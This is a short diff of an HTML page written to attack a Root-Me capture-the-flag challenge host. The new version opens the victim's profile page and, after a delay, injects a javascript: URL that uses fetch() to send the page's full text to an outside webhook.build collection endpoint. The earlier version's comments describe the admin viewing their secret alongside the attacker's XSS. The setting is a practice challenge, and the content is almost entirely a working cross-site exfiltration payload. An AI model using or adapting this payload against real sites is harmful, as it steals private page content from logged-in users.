@@ -1,11 +1,10 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // This opens YOUR profile in the admin's browser
-        // Since the admin is logged in, they see THEIR secret + YOUR XSS
-        window.open('http://challenge01.root-me.org:58003/profile', 'victim');
-    </script>
-    <h1>Redirecting to Secure Vault...</h1>
-</body>
-</html>
+<script>
+  // 1. Open the profile page
+  var win = window.open('http://challenge01.root-me.org:58003/profile');
+
+  // 2. Use the 'opener' relationship to inject the leak
+  // We wait a bit for the page to load
+  setTimeout(() => {
+    win.location = "javascript:fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + document.body.innerText)";
+  }, 1000);
+</script>
